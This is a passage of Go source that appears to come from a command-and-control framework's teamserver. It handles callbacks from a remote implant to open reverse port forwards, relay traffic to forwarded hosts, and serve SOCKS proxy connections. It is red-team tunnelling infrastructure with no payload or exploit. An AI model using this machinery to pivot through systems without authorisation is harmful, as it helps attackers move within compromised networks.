			case SOCKET_COMMAND_SOCKSPROXY_ADD:
				break

			case SOCKET_COMMAND_OPEN:

				if Parser.Length() >= 16 {

					var (
						SocktID = 0
						LclAddr = 0
						LclPort = 0
						FwdAddr = 0
						FwdPort = 0

						FwdString string
					)

					SocktID = Parser.ParseInt32()
					LclAddr = Parser.ParseInt32()
					LclPort = Parser.ParseInt32()
					FwdAddr = Parser.ParseInt32()
					FwdPort = Parser.ParseInt32()

					FwdString = common.Int32ToIpString(int64(FwdAddr))
					FwdString = fmt.Sprintf("%s:%d", FwdString, FwdPort)

					if Socket := a.PortFwdGet(SocktID); Socket != nil {
						/* Socket already exists. don't do anything. */
						return
					}

					/* add this rportfw */
					a.PortFwdNew(SocktID, LclAddr, LclPort, FwdAddr, FwdPort, FwdString)

					err := a.PortFwdOpen(SocktID)
					if err != nil {
						a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to open reverse port forward host %s: %v", FwdString, err), "")
						return
					}

					/* after we managed to open a socket to the forwarded host lets start a
					 * goroutine where we read the data from the forwarded host and send it to the agent. */
					go func() {

						for {

							/* get rportfwd socket from array */
							if Socket := a.PortFwdGet(SocktID); Socket != nil {

								if Data, err := a.PortFwdRead(SocktID); err == nil {

									/* only send the data if there is something... */
									if len(Data) > 0 {

										/* make a new job */
										var job = Job{
											Command: COMMAND_SOCKET,
											Data: []any{
												SOCKET_COMMAND_READ_WRITE,
												Socket.SocktID,
												Data,
											},
										}

										/* append the job to the task queue */
										a.AddJobToQueue(job)

									}

								} else {
									/* we failed to read from the portfwd */
									logger.Error(fmt.Sprintf("Failed to read from socket %x: %v", Socket.SocktID, err))
								}

							} else {
								/* seems like we have been removed from the list.
								 * exit this goroutine */
								return
							}

						}

					}()

				}

				break

			case SOCKET_COMMAND_READ_WRITE:
				/* if we receive the SOCKET_COMMAND_READ_WRITE command
				 * that means that we should read the callback and send it to the forwared host/socks proxy */

				if Parser.Length() >= 8 {
					var (
						Id   = Parser.ParseInt32()
						Type = Parser.ParseInt32()
						Data = Parser.ParseBytes()
					)

					if Type == SOCKET_TYPE_CLIENT {

						/* check if there is a socket with that portfwd id */
						if Socket := a.PortFwdGet(Id); Socket != nil {

							/* write the data to the forwarded host */
							err := a.PortFwdWrite(Id, Data)
							if err != nil {
								a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to reverse port forward host %s: %v", Socket.Target, err), "")
								return
							}

						} else {

							logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))

						}

					} else if Type == SOCKET_TYPE_REVERSE_PROXY {

						/* check if there is a socket with that socks proxy id */
						if Socket := a.SocksClientGet(Id); Socket != nil {

							/* write the data to socks proxy */
							_, err := Socket.Conn.Write(Data)
							if err != nil {
								a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to socks proxy %v: %v", Id, err), "")

								/* TODO: remove socks proxy client */
								a.SocksClientClose(SOCKET_TYPE_CLIENT)

								return
							}

						} else {

							logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))

						}

					}

				}

				break

			case SOCKET_COMMAND_CLOSE:

				if Parser.Length() >= 8 {
					var (
						SockId = Parser.ParseInt32()
						Type   = Parser.ParseInt32()
						Socket *PortFwd
					)

					/* NOTE: for now the reverse port forward close command is not used. */
					if Type == SOCKET_TYPE_REVERSE_PORTFWD || Type == SOCKET_TYPE_CLIENT {

						/* check if there is a socket with that portfwd id */
						if Socket = a.PortFwdGet(SockId); Socket != nil {

							/* Based on the type of the socket tell the operator
							 * for example SOCKET_TYPE_CLIENT is something we can ignore.
							 * But if it's a SOCKET_TYPE_REVERSE_PORTFWD then let the operator know. */
							if Type == SOCKET_TYPE_REVERSE_PORTFWD {
								var LclString = common.Int32ToIpString(int64(Socket.LclAddr))
								a.Console(teamserver.AgentConsole, "Info", fmt.Sprintf("Closed reverse port forward [Id: %x] [Bind %s:%d] [Forward: %s]", Socket.SocktID, LclString, Socket.LclPort, Socket.Target), "")
							}

							/* finally close our port forwarder */
							a.PortFwdClose(SockId)
						}

					} else if Type == SOCKET_TYPE_REVERSE_PROXY {

						if Client := a.SocksClientGet(SockId); Client != nil {

							/* lets remove it */
							a.SocksClientClose(SockId)

						}

					}
				}

				break

			case SOCKET_COMMAND_CONNECT:

				if Parser.Length() >= 4 {

					var (
						Success  = Parser.ParseInt32()
						SocketId = Parser.ParseInt32()
					)

					if Client := a.SocksClientGet(SocketId); Client != nil {

						if Success == win32.TRUE {

							_, err := Client.Conn.Write([]byte{0x00, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
							if err != nil {
								return
							}
							Client.Connected = true

						} else {

							a.SocksClientClose(SocketId)

						}

					} else {

						logger.Error(fmt.Sprintf("Socket id not found: %x\n", SocketId))

					}

				}

				break
			}

		} else {
			Message = map[string]string{
				"Type":    "Error",
				"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET expected at least 4 bytes but received %v bytes", Parser.Length()),
			}
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	default:
		/* end of the switch case output parser */
		break
	}
}

func (a *Agent) Console(Console func(DemonID string, CommandID int, Output map[string]string), Type, Text, Output string) {
	var Message = map[string]string{
		"Type":    Type,
		"Message": Text,
		"Output":  Output,
	}

	Console(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
}
